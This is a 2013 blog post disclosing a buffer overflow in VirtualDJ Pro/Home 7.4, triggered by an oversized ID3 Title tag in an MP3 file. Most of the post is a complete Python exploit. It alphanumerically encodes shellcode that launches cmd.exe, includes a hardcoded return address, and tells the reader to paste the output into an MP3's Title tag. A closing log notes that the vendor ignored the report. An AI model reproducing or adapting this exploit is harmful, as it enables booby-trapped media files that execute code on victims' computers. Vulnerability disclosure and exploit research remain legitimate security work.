---
layout: post
date: 2013-04-20 00:00:00 UTC
title: VirtualDJ Pro/Home 7.4: Buffer Overflow
---

I have found a buffer overflow vulnerability in [VirtualDJ Pro 7.4 and VirtualDJ Home 7.4](http://www.virtualdj.com/) and possibly previous versions of this software. After right-clicking a file and entering the "_File Infos_" > "_Cover..._" menu, VirtualDJ tries to find a cover for the given file on Google Images and stores the request URL in a buffer which looks like: `"http://images.google.com/images?q=X"` where `X` corresponds to the ID3 tag _Title_. Special characters of this tag are ignored, and any sequence of symbols (e.g. `' '`, `'-'`, `'_'`) is replaced with `'+'`. The problem is [once again](2013-03-30-virtualdj-73-buffer-overflow.md) that VirtualDJ does not check if the information stored in the ID3 tags is too big to fit in the buffer.

To exploit this vulnerability, I searched for a `call esp` instruction stored in an address that could be represented with alphanumeric characters, I found such instruction in 0x444D4C64, that is, `"dLMD"`. After entering this call, all the bytes after the _Fake Title_ + _Spaces_ + _Padding_ + `"dLMD"` will be executed. Since we can only use alphanumeric characters, we have to encode the shellcode and decode it in execution time using only bytes in range `[0-9A-Za-z]`. For this purpose I used a function from [ALPHA3](http://code.google.com/p/alpha3/). After that, the original shellcode will be decoded and executed.

```python
#Exploit: VirtualDJ Pro/Home <=7.4 Buffer Overflow Vulnerability 
#By: Alexandro Sanchez Bach | functionmixer.blogspot.com 
#More info: http://www.youtube.com/watch?v=Yini294AR2Q 

def encodeData(decoder, data, validValues):
    assert data.find("\0") == -1, "Shellcode must be NULL free"
    data += "\0" #End of shellcode 
    encData = decoder[-2:]
    decoder = decoder[:-2]
    for p in range(len(data)):
        dByte = ord(data[p])
        pxByte = ord(encData[p+1])
        bx, by = encoder(dByte ^ pxByte, validValues)
        encData += chr(bx) + chr(by)
    return decoder + encData
 
def encoder(value, validValues): 
      for bx in validValues:
        imul = (bx * 0x30) &amp; 0xFF
        for by in validValues:
            if imul ^ by == value: return [bx, by]
 

#Shellcode (e.g. run cmd.exe) 
shellcode  = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
shellcode += "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
shellcode += "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45"
shellcode += "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
shellcode += "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
retAddress = "\xED\x1E\x94\x7C" # jmp ESP ntdll.dll WinXP SP2 
shellcode += retAddress

#Arguments 
fakeTitle  = "Greatest Hits of the Internet - Nyan Cat"
while fakeTitle[0]  == " ": fakeTitle = fakeTitle[1:]
while fakeTitle[-1] == " ": fakeTitle = fakeTitle[:-1]
for i in fakeTitle:
    if i not in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz -":
        raise "Invalid characters in the fake title"
fakeTitle2 = fakeTitle.replace("-"," ")
while " " in fakeTitle2: fakeTitle2 = fakeTitle2.replace(" "," ")

#Exploit 
exploit =  fakeTitle + " "*1024 + "1"*(1026 - len(fakeTitle2)-1)
exploit += "dLMD" #RETN address 
exploit += "XXAI" #ESP := Baseaddr of encoded payload 
exploit += encodeData(
	"TYhffffk4diFkDql02Dqm0D1CuEE", #Baseaddr of encoded payload := ESP 
    shellcode,
    map(ord, list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"))
)

print exploit
#Paste the generated code in the tag 'Title' of the MP3 file.
```

You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=Yini294AR2Q.

## Log

* __2013-04-07__: Bug discovered. VirtualDJ was emailed about this a few days later.
* __2013-04-20__: Bug ignored. Exploit published.
